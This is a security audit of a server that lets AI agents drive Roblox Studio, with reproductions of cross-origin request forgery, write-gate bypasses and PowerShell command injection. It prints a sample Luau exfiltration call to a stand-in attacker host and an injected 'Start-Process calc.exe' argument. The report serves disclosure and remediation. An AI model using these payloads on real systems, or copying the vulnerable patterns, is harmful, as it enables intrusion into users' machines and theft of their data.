# Cubes Roblox MCP — security & correctness audit

**Scope:** `src/` (the MCP server half) at commit `2533818`, plus docs.
**Date:** 2026-09-11
**Method:** full read of all 16 `src/*.ts` modules, then empirical verification against a
running server driven by a stub Studio plugin (long-polls `/poll`, echoes commands,
reports a configurable `writeEnabled`). Every finding marked **Confirmed** was reproduced
against the real built `dist/` — not inferred from reading.

**What is NOT in scope:** the Roblox Studio plugin. `.gitignore` line 29 excludes `roblox/`
("distributed separately, never committed"), so the Luau half could not be read or run.
Findings that depend on plugin behaviour are marked **Plugin-dependent** and say exactly
what could and could not be established.

Baseline health: `tsc --noEmit` is clean, `npm run build` succeeds, no dependency
vulnerabilities in a 2-package tree.

---

## Summary

| # | Severity | Finding | Status |
|---|---|---|---|
| 1 | **Critical** | Any web page can drive `/rpc` into Studio — no Origin/Host/Content-Type check, and the write gate only covers two tool names | Confirmed |
| 2 | **High** | "Allow writes" is bypassable from the MCP surface: `evalTool` defaults to `write: false`, and `wait_until` `loadstring`s caller-supplied Luau | Confirmed |
| 3 | **High** | PowerShell command injection via `screenshot.insets` — nothing validates tool args against `inputSchema` | Confirmed |
| 4 | **High** | HTTP bridge reads request bodies with no size cap | Confirmed |
| 5 | Medium | A dead long-poll socket silently eats one command and stalls the caller for the full timeout | Confirmed |
| 6 | Medium | One bad protocol handshake poisons every later `send()` permanently | Confirmed |
| 7 | Medium | Inline Luau lint can never run — `cwd` points at a directory the repo no longer ships | Confirmed |
| 8 | Medium | `search_tools` reports tools as unlocked that the same turn evicts — best matches dropped first | Confirmed |
| 9 | Medium | `isError` is never set, so MCP clients read every failure as a success | Confirmed |
| 10 | Medium | `resources/read` bypasses the write gate entirely | Confirmed |
| 11 | Medium | Concurrent `profile_update` loses 9 of 10 writes; the code comment claims the opposite | Confirmed |
| 12 | Medium | `luaJson` emits `\uXXXX`, which Luau cannot parse — generated script fails to compile | Confirmed |
| 13 | Medium | `script_edit` overwrites script source with no confirm gate and no lint | Confirmed |
| 14 | Medium | `instance_duplicate.count` is uncapped | Confirmed |
| 15 | Medium | Screenshot: no size cap, temp files never cleaned, full-monitor default | Confirmed |
| 16-26 | Low | Fail-open op classification, leaks, doc drift, no CI — see below | Confirmed |

---

## 1. Critical — any web page can drive `/rpc` into Studio

**Files:** `src/bridge.ts:263-311` (the `/rpc` handler), `src/bridge.ts:380-395` (`readJson`)

Five independent checks that would each have stopped this are all absent:

| Check | Present? |
|---|---|
| `Origin` header validated | no |
| `Host` header validated | no |
| `Content-Type` enforced | no — `readJson` parses any body |
| Write-mode toggle honoured | **only for the literal strings `"eval"` and `"mutate"`** (`bridge.ts:273`) |
| Token required | no — `CUBES_MCP_RPC_TOKEN` is opt-in and unset by default |

`bridge.ts:273` is the core mistake:

```ts
const isWrite = tool === "eval" || tool === "mutate";
```

`/rpc` forwards *any* `tool` string straight to the plugin. Every plugin-native write tool
is outside that two-name allowlist — including `tune`, whose own description
(`src/seed.ts:1417`) reads *"Run arbitrary Luau inside the RUNNING playtest's server
DataModel."*

Because `readJson` ignores `Content-Type`, a `text/plain` POST qualifies as a CORS
*simple request*: no preflight, so the browser sends it. The response is opaque to the
attacker, but the side effect has already run. Separately, the missing `Host` check means
a DNS-rebinding page becomes same-origin and can read responses too.

**Reproduction** (`Allow writes` OFF, `CUBES_MCP_RPC_TOKEN` unset — the documented default):

```
POST /rpc from https://evil.example -> 200 {"ok":true,"result":{"echoed":"tune"}}

What Studio was asked to run:
  tune | {"luau":"game:GetService(\"HttpService\"):PostAsync(\"https://evil.example/exfil\", game.PlaceId)"}
```

Gate coverage measured against a connected plugin with writes OFF:

```
eval                   HTTP 403  BLOCKED by write gate
mutate                 HTTP 403  BLOCKED by write gate
tune                   HTTP 200  PASSED THROUGH TO STUDIO
playtest_play          HTTP 200  PASSED THROUGH TO STUDIO
character_teleport     HTTP 200  PASSED THROUGH TO STUDIO
playtest_set_players   HTTP 200  PASSED THROUGH TO STUDIO
snapshot               HTTP 200  PASSED THROUGH TO STUDIO
event_watch            HTTP 200  PASSED THROUGH TO STUDIO
```

**Plugin-dependent:** whether `tune` actually executes the Luau depends on the plugin's
dispatch table, which this repo does not contain. What is fully established server-side is
that the payload reaches the plugin unauthenticated, from a cross-origin web request, with
the user's write toggle off.

**Fix direction:** reject requests carrying an `Origin` header; require `Host` to be
`127.0.0.1`/`localhost` on the configured port; require `Content-Type: application/json`;
replace the two-name allowlist with a deny-by-default list of read-only tools; consider
making the RPC token mandatory rather than opt-in.

---

## 2. High — "Allow writes" is bypassable from the MCP tool surface

**Files:** `src/registry.ts:183-192` (`evalTool`), `src/server.ts:776-782` (`isWriteTool`),
`src/seed.ts:1952-1987` (`wait_until`), `src/seed.ts:446-508` (`debug_highlight`),
`src/seed.ts:749-764` (`debug_clear`)

`evalTool` defaults `write` to `false` (`registry.ts:186`), but every `evalTool` ships
generated Luau down the same `eval` channel that `run_code` uses. The `write` flag is a
hand-maintained label, and several tools that mutate the DataModel are unlabelled.

Measured with a connected plugin reporting `writeEnabled: false`:

```
--- baseline: tools the gate DOES catch ---
BLOCKED         mutate
BLOCKED         run_code
BLOCKED         script_edit

--- specialists that reach Studio's eval path with writes OFF ---
REACHED-STUDIO  wait_until
REACHED-STUDIO  debug_highlight
REACHED-STUDIO  debug_clear
REACHED-STUDIO  test_run
REACHED-STUDIO  step_frames
REACHED-STUDIO  selection_set
```

The worst of these is `wait_until`, declared `write: false` at `seed.ts:1958`:

```lua
local checkSrc = "return (" .. a.predicate .. ")"
local fn, err = loadstring(checkSrc)
```

`predicate` is a caller-supplied string. `(function() <anything> end)()` is a valid
predicate. So a tool explicitly flagged as non-writing evaluates arbitrary Luau in the
plugin's elevated context — exactly what `run_code` is gated for.

`debug_highlight` and friends are less dramatic but still real DataModel writes:
`Instance.new("Folder")`, `Instance.new("Highlight")`, `hl.Parent = folder`, and
`debug_clear` calls `f:Destroy()` on a Workspace child.

**Fix direction:** invert the default — `evalTool` should be `write: true` unless a tool
opts out — and give `wait_until` a real expression evaluator or drop it. `selection_set`
and `test_run` deserve an explicit decision either way rather than an accidental default.

---

## 3. High — PowerShell command injection via `screenshot.insets`

**Files:** `src/vision.ts:46-79` (`studioWindowPs`), `src/vision.ts:139-157` (handler),
`src/server.ts:380` (args are cast, never validated)

`studioWindowPs` interpolates the inset values straight into a PowerShell script:

```ts
$x = $rect.L + ${l}
$w = ($rect.Rt - $rect.L) - ${l} - ${r}
```

The JSON Schema declares `insets.top` as `type: "number"`, but nothing enforces it. The
low-level MCP SDK `Server` does not validate `arguments` against `inputSchema`, and
`server.ts:377` does a bare cast:

```ts
const args = (req.params.arguments ?? {}) as Record<string, unknown>;
```

**Reproduction** — captured the script the server actually spawned, with
`insets.top = "0\n Write-Host PWNED; Start-Process calc.exe #"`:

```powershell
$x = $rect.L + 0
$y = $rect.T + 0
 Write-Host PWNED; Start-Process calc.exe #
$w = ($rect.Rt - $rect.L) - 0 - 0
$h = ($rect.B - $rect.T) - 0
 Write-Host PWNED; Start-Process calc.exe # - 0
```

Injected statements land at top level and execute on Windows.

Note the general shape: **no tool argument anywhere in this server is validated against its
declared schema.** `insets` is where that becomes code execution, but the same gap lets
`read({limit: "; DROP TABLE --"})` through untouched, and it is what makes finding 14
possible.

**Fix direction:** coerce insets with `Number()` and reject non-finite values; more broadly,
add a schema-validation pass (ajv, or the SDK's `McpServer` + zod wrapper) in front of every
handler.

---

## 4. High — unbounded request bodies on the bridge

**File:** `src/bridge.ts:380-395`

`readJson` accumulates chunks with no `Content-Length` check, no byte cap, and no
`req.destroy()` on overflow. Measured against a live bridge:

```
server RSS 64MB -> 474MB after ONE 64MB POST
```

~7x amplification (chunk array, `Buffer.concat`, the UTF-8 string, then the parsed object).
Combined with finding 1 this is remotely reachable, and a handful of parallel posts will OOM
the server. `/poll`, `/result` and `/rpc` all share this path.

**Fix direction:** cap at a few MB, destroy the socket past the cap, and reject an
oversized `Content-Length` before reading.

---

## 5. Medium — a dead long-poll socket eats a command and stalls the caller

**File:** `src/bridge.ts:318-348` (`handlePoll`)

`handlePoll` registers a waiter in `this.waiters` and removes it on exactly one path: the
25s timer. There is no `res.on("close")` / `req.on("aborted")` handler. When Studio dies or
the socket resets, the dead waiter stays queued. The next `send()` shifts it, calls
`res.end(...)` on a destroyed socket (a silent no-op), and the command is gone — it never
returns to `this.queue`, so a reconnecting plugin never sees it.

**Reproduction:**

```
step 1: the ONLY plugin poll parks on the bridge
        waiters parked: 1
step 2: Studio dies — socket aborted, no res.on('close') handler
step 3: server queues a command; it is handed to the DEAD response
step 4: plugin reconnects immediately and polls for work
        reconnected poll -> HTTP 204 after 25009ms, command received: NONE
        queued depth now: 0
result : studio_timeout
```

Every Studio crash, Studio restart, or network blip during a long poll costs exactly one
silently dropped tool call plus a full 30s stall.

**Fix direction:** `res.on("close", ...)` to drop the waiter; on a write failure, push the
command back onto `this.queue` instead of discarding it.

---

## 6. Medium — `protocolMismatch` is sticky forever

**File:** `src/bridge.ts:119-128`, `src/bridge.ts:176-191`

`_protocolMismatch` is set on any `/poll` with a wrong or missing `protocol` field, and is
cleared *only* by a subsequent good poll. Until then `send()` rejects everything up front.
Any process that POSTs a malformed body to `/poll` — including the unauthenticated path in
finding 1 — permanently disables the server for the session:

```
mismatch recorded: {"expected":1,"got":999}
every later send() now fails with: plugin_version_mismatch
```

The user-facing message also tells them to rebuild from `roblox/plugin.project.json`
(`bridge.ts:124`) — a path this repo does not contain (finding 20).

**Fix direction:** treat the mismatch as a property of the last poll, not sticky state, or
expire it against `lastSeen`.

---

## 7. Medium — inline Luau lint can never run

**File:** `src/lint.ts:19`, `src/lint.ts:91`

```ts
const ROBLOX_DIR = join(dirname(fileURLToPath(import.meta.url)), "..", "roblox");
...
spawn(SELENE_BIN, [file, "--display-style", "json"], { cwd: ROBLOX_DIR });
```

`.gitignore:29` excludes `roblox/`. Nobody who clones this repo has that directory, so the
spawn fails on the **cwd**, before the binary is even looked up:

```
repo has roblox/ dir: false
cwd = repo root (exists)                        -> ok
cwd = repo/roblox (lint.ts ROBLOX_DIR, deleted) -> spawn error: ENOENT
lintLuau result: {"error":"lint unavailable: spawn selene ENOENT"}
```

Installing selene does not help. `src/lint.ts:14` also cites `roblox/selene.toml` for the
Roblox std — also gone, so even with a valid cwd the lint would run without the Roblox
standard library.

The failure is silent by design (`lint.ts:78-79` degrades to `{ error }`), so every
`mutate` that writes script source reports a `lint` entry that looks like a transient
tooling blip rather than a permanently dead feature. README advertises inline lint as a
headline property of `mutate`.

**Fix direction:** default the cwd to the project root, make the selene config path
configurable, and surface "lint not configured" once at startup instead of per call.

---

## 8. Medium — `search_tools` lies about what it unlocked

**Files:** `src/server.ts:502-526` (`handleSearchTools`), `src/session.ts:72-98` (`evict`),
`src/server.ts:483-487`

`handleSearchTools` unlocks every match and returns *"They are now in your tool list."*
`evict()` then runs at the end of the same `tools/call` (`server.ts:485`) and trims
specialists to a cap of 8. Nothing reconciles the two.

```
server SAYS unlocked: debug_clear, debug_highlight, debug_axes, debug_label, debug_bounds,
                      spawn_marker, debug_error, terrain_clear, selection_set, script_read,
                      playtest_result, sound_play
server MESSAGE     : Unlocked 12 tool(s): ... They are now in your tool list.
actually in tools/list: search_tools, read, screenshot, mutate, run_code, debug_bounds,
                      spawn_marker, debug_error, terrain_clear, selection_set, script_read,
                      playtest_result, sound_play
>>> claimed-but-absent: 4 -> debug_clear, debug_highlight, debug_axes, debug_label
```

Two problems, not one:

1. The response contradicts `tools/list`. The agent is told it has tools it does not have.
2. **The evicted four are the four highest-ranked matches.** `evict` sorts by `lastUsed`
   (`session.ts:88`); within one turn every entry ties, so the sort is a no-op and `.slice(0, n)`
   takes the front of the array — which is ranked order. The best answers to the query are
   exactly the ones thrown away.

`limit` has no upper bound (`server.ts:508`), so this triggers on any `limit > 8`. It also
accumulates across turns: three default-limit searches in a session will start silently
dropping results.

**Fix direction:** run `evict` before building the response and report the surviving set;
clamp `limit` to the cap; sort eviction candidates so recency ties break toward *older*
unlocks, not higher-ranked ones.

---

## 9. Medium — `isError` is never set on failures

**File:** `src/server.ts:497`

Every response goes out as `{ content: [{ type: "text", text: JSON.stringify(payload) }] }`.
The MCP spec signals tool failure with `isError: true` on the result; without it, clients
treat protocol errors, bad args, and unknown tools as successful calls:

```
read               isError=undefined  payload-has-error=true  {"error":"studio_not_connected",...}
mutate             isError=undefined  payload-has-error=true  {"error":"bad_args",...}
run_code           isError=undefined  payload-has-error=true  {"error":"bad_args",...}
nonexistent_tool   isError=undefined  payload-has-error=true  {"error":"unknown_tool",...}
search_tools       isError=undefined  payload-has-error=true  {"error":"bad_args",...}
```

Any client with retry-on-error, error counting, or failure surfacing sees a clean run.

**Fix direction:** set `isError: true` whenever the payload carries an `error` key.

---

## 10. Medium — `resources/read` bypasses the write gate

**File:** `src/server.ts:341-372`

The write gate lives in the `CallToolRequestSchema` handler only. The resource handler
calls `bridge.send("eval", ...)` directly for `studio://overview` (`server.ts:351`) and
`studio://selection` (`server.ts:366`) — the same channel `/rpc` classifies as write-class.

```
tools/call run_code   -> {"error":"write_mode_disabled",...}
resources/read studio://overview      -> { "echoed": "eval" }
resources/read studio://selection     -> { "echoed": "eval" }
resources/read studio://errors/recent -> { "echoed": "diagnostics" }
```

The Luau in both is a fixed constant, so this is not itself an injection route. It matters
for two reasons: the gate's coverage is not what the README describes, and if the plugin
ever refuses `eval` while writes are off, `studio://overview` — the resource the README
tells agents to read first — breaks in the default posture. **Plugin-dependent:** which of
those two is true cannot be determined from this repo.

---

## 11. Medium — concurrent profile writes are lost

**File:** `src/profile.ts:108-121`, `src/seed.ts:885-916`

The doc comment on `updateProfile` says:

> Load → mutate via callback → save in one shot. Used by the `profile_update` tool so
> concurrent writes serialize through the same load-mutate-save cycle.

Nothing serializes. It is an unguarded async read-modify-write:

```
10 concurrent profile_update calls -> 1/10 survived: [ 'issue-8' ]
```

The `profile_update` handler (`seed.ts:885`) does not even use `updateProfile` — it inlines
`loadProfile` → `applyPatch` → `saveProfile`, same race.

Two smaller issues in the same file: `saveProfile` (`profile.ts:105`) uses a plain
`writeFile`, which truncates first — a crash mid-write corrupts the profile with no backup;
and `decisions` / `knownIssues` / `sessionLog` are append-only with no cap, so the file
grows without bound across sessions.

**Fix direction:** a per-placeId promise chain (or a lockfile) around load-mutate-save;
write to a temp file and `rename` for atomicity; cap the append-only arrays.

---

## 12. Medium — `luaJson` emits escapes Luau cannot parse

**File:** `src/registry.ts:225-230`

The comment asserts:

> the second stringify produces a JSON-quoted string literal that's also a valid Lua string
> literal (Lua double-quoted strings accept the same escape sequences JSON uses).

That is false for control characters outside JSON's five named escapes. JSON emits
`\u0007`; Luau expects `\u{7}` and rejects a bare `\uXXXX`:

```
tab                 -> "{\"s\":\"a\tb\"}"           ok
bell (0x07)         -> "{\"s\":\"a\u0007b\"}"       <-- compile error in Luau
vertical tab (0x0b) -> "{\"s\":\"a\u000bb\"}"       <-- compile error in Luau
NUL (0x00)          -> "{\"s\":\"a\u0000b\"}"       <-- compile error in Luau
form feed (0x0c)    -> "{\"s\":\"a\fb\"}"           ok
```

`luaJson` is the argument-passing mechanism for **all 33 `evalTool` specialists** (21 in `seed.ts`, 12 in `pro.ts`). Any arg
carrying such a byte — a `script_edit` find/replace string against a file with a stray
control char, a pasted `wait_until` predicate, a label — produces Luau that fails to compile,
surfacing as an opaque `compile_error` rather than a bad-input message.

**Fix direction:** post-process the literal, rewriting `\uXXXX` to Luau's `\u{XXXX}`, or
escape every byte below 0x20 as a decimal `\ddd` escape.

---

## 13. Medium — `script_edit` bypasses both mutate safety rails

**File:** `src/seed.ts:327-444`

`safety.ts:40` classifies writing `Source` as **`hard`**, requiring `confirm: true`:

```ts
if (op.op === "set") {
  return op.props && typeof op.props === "object" && "Source" in op.props ? "hard" : "soft";
}
```

`script_edit` does exactly that operation (`inst.Source = source`, `seed.ts:419`) through the
`eval` path, so it gets neither rail:

- **No confirm gate.** The identical change via `mutate` returns `needs_confirmation`.
- **No lint.** `lintScriptOps` (`server.ts:584-612`) only inspects ops with `props.Source`,
  so the tool purpose-built for editing scripts is the one script path that is never linted.
  (Moot today given finding 7, but it is a second independent gap.)

`script_edit` *is* `write: true`, so the Allow-writes toggle still applies — it is the
destructiveness confirmation that is missing, which is what protects a user's existing code
from being silently overwritten.

**Fix direction:** route `script_edit` through `ctx.handleMutate` as a `set`+`Source` op, or
have it call `assessDestructiveness` and `lintLuau` itself.

---

## 14. Medium — `instance_duplicate.count` is uncapped

**File:** `src/seed.ts:62`

```lua
for i = 1, (a.count or 1) do
  local c = src:Clone()
```

No bound. `instance_duplicate({ target: "Workspace.BigModel", count: 1000000 })` clones
inside a `ChangeHistoryService` recording and will hang Studio. The sibling tool
`parts_grid` caps at 50×50 with an explicit comment about exactly this (`seed.ts:106-111`),
so the omission looks accidental rather than deliberate. Reachable with a non-numeric or
absurd value because of finding 3's missing validation.

**Fix direction:** clamp server-side in the builder, matching `parts_grid`.

---

## 15. Medium — screenshot: unbounded payload, leaked temp files, over-broad default

**File:** `src/vision.ts:109-213`

Three separate problems in the one core tool:

- **No size cap.** The full PNG is base64'd into an MCP image block with no downscale and no
  byte ceiling (`vision.ts:188-205`). A 1440p capture is 1-3MB raw, ~1.4-4MB base64 —
  enough to blow a context window or a client's message limit in a single call.
- **Temp files leak.** `unlink` runs on every failure path (`vision.ts:172, 179, 207`) but
  **not on success** — the handler returns `savedTo: path` and leaves the file. One PNG per
  screenshot accumulates in the system temp dir for the life of the machine.
- **Default region is `full`**, the entire primary monitor. Whatever else the user has open
  — mail, credentials, unrelated windows — is captured and shipped to the model. Neither the
  tool description nor the README flags this.

Related: `screenshot` is a **core** tool, always present in `tools/list`, but is
Windows-only (`spawn("powershell.exe", ...)`, `vision.ts:85`). On macOS or Linux:

```
{"error":"screenshot_failed","message":"spawn powershell.exe ENOENT"}
```

README's setup section documents a macOS plugin path (`~/Documents/Roblox/Plugins`), so
macOS is a supported platform on which a core tool can never work. `src/lint.ts:20` already
does the platform branch correctly, so the convention exists — `vision.ts` just doesn't
follow it.

---

## 16-26. Low

**16 — `classifyOp` fails open.** `safety.ts:37-50` returns `"soft"` for any `op` verb it
does not recognise. If the plugin's mutate handler supports verbs the schema enum does not
list, they are unclassified and unconfirmed. Verified: `{op: "reparent", target: "Workspace"}`
→ `level=soft, needsConfirm=false`. Unknown verbs should classify as `hard`.

**17 — nuclear detection is exact-string only.** `NUCLEAR_SERVICES.has(target)`
(`safety.ts:46`) matches the bare name only:

```
bare service name                 -> level=nuclear  needsConfirm=true
dotted from game (game.Workspace) -> level=hard     needsConfirm=true
ref token pointing at Workspace   -> level=hard     needsConfirm=true
lowercase alias (workspace)       -> level=hard     needsConfirm=true
@id from same batch               -> level=hard     needsConfirm=true
```

All still require confirmation, so this is a message-accuracy bug rather than a hole — the
user is warned "delete 1 instance(s)" when the batch deletes a whole service. Worth fixing
because the wording is what the user's confirm decision rests on.

**18 — `cancelledOrder` never drains.** `bridge.ts:350-361` deletes the id from the `Set` on
a late `/result` but leaves it in the parallel array; the eviction loop (`bridge.ts:163`) is
driven by `Set.size`, which no longer counts it:

```
cancelled Set size : 1000 (capped)      cancelledOrder len : 1000
after 1000 late /result arrivals:
cancelled Set size : 0                  cancelledOrder len : 1000  <- never drains
```

Grows with total lifetime timeouts. Slow leak on a long-lived server.

**19 — `suggestNext("snapshot")` emits an empty follow-up.** `suggest.ts:176` reads
`p.snapshot ?? p.snapshotId`; the handler returns `{ name, path, instanceCount, capturedAt }`
(`seed.ts:1098-1109`). Neither key exists, so the "one-click follow-up" is
`{"call":"diff","args":{}}`. Should be `p.name`.

**20 — documentation drift.** The `roblox/` half was removed in `2533818` but the docs were
not:
- `CLAUDE.md:11,13,23,26-27,54-55` describes `roblox/`, `roblox/src/Transport.luau`,
  `roblox/src/StatusUi.luau` and a `rojo build plugin.project.json` command. None exist here.
- `CLAUDE.md:53` and `server.ts:24` both say **four** core tools and omit `screenshot`.
  README says five; the code has five (`session.ts:10`).
- README names `lighting_configure` and `script_create` as available specialists. Verified
  against the 58-entry registry: **neither exists** — `seed.ts:439-440` records that
  `script_create` was deliberately removed.
- `bridge.ts:124`, `lint.ts:14-15`, `vision.ts:17-20` all cite files the repo no longer ships.

**21 — no tests that run without Studio, no CI.** `package.json` exposes `test:e2e` and
`test:repl`, both of which require a live Studio with the plugin connected; there is no
`test` script. No `.github/` directory. Everything in this audit that is pure logic —
`safety.ts`, `snapshot-diff.ts`, `session.evict`, `luaJson`, `registry.search` — is unit
testable today with zero Roblox dependency.

**22 — yielding evals monopolise the bridge.** `wait_until` (up to 25s), `logs_wait_for` (up
to 25s) and `step_frames` (up to 600 frames) block on the plugin side while the bridge holds
a single command queue. Any other tool call queued behind one will burn its own 30s timeout.
**Plugin-dependent** — whether the plugin can poll while executing is not visible from here —
but the server-side default timeout (`bridge.ts:118`) leaves only a 5s margin over a 25s
yield, which is thin regardless.

**23 — post-listen server errors are swallowed.** `bridge.ts:109` registers
`this.httpServer.on("error", reject)`. After `listen` resolves, later errors call `reject` on
a settled promise and vanish. Log them instead.

**24 — `_writeEnabled` is never reset on disconnect.** `bridge.ts:192` only assigns when the
field is a boolean, and nothing clears it when the plugin stops polling. `writeEnabled`
(`bridge.ts:92`) is saved by the `connected` conjunction, but the stale flag means a
reconnecting plugin that omits the field inherits the previous session's toggle.

**25 — every payload is serialized three times.** `estTokens` (`server.ts:787`)
`JSON.stringify`s args and payload for the token estimate, then `server.ts:497` stringifies
the payload again for the wire. On a large `read` that is three full serializations per call.
`buildMeta` and the final stringify also sit **outside** the handler's try/catch
(`server.ts:448`, `server.ts:497`), so a payload that cannot be serialized throws out of the
request handler rather than returning a structured error.

**26 — history retains full arguments.** `memory.record` (`server.ts:457`) stores `args`
verbatim, including whole script sources from `mutate` ops, capped at 200 entries by count
(`memory.ts:44`) rather than by bytes. `historyView` strips args for display, but the raw
copies stay resident.

---

## Suggested order of work

1. **Finding 1** — the bridge is the trust boundary and it currently has none. Origin/Host/
   Content-Type checks plus a deny-by-default tool gate.
2. **Findings 2 + 3 + 16** — one theme: safety flags and schemas are decorative because
   nothing validates or enforces them. Add schema validation, invert `evalTool`'s default,
   make unknown op verbs fail closed.
3. **Finding 4, 5** — bridge robustness: body cap, socket-close handling.
4. **Findings 7, 8, 9, 11, 12** — correctness bugs where the code's stated contract and its
   behaviour disagree. Each is small and independently fixable.
5. **Finding 21** — land unit tests for `safety`, `session.evict`, `luaJson`, and
   `snapshot-diff` so findings 8, 12, 16 and 17 cannot regress.
6. **Finding 20** — docs, once the code settles.

---

## Reproduction harness

The probes used for this audit live in the session scratchpad, not in the repo:

- `fakeplugin.mjs` — stub Studio plugin: long-polls `/poll`, echoes commands to `/result`,
  configurable `writeEnabled`.
- `mcpclient.mjs` — minimal MCP stdio client exposing raw `tools/call` results so `isError`
  is observable.
- `p1_writegate.mjs` (finding 2), `p2_evict.mjs` (8), `p3_proto.mjs` (9, 15),
  `p4_psinject.mjs` (3), `p5_bridge.mjs` (1, 4, 6), `p6_waiter.mjs` (5),
  `p7_misc.mjs` (11, 12, 16, 17), `p8_more.mjs` (7, 10, 18), `p9_rpc.mjs` (1, 19),
  `p10_chain.mjs` (1).

They are worth promoting into `test/` as regression tests — most of them are already
assertions in all but name.
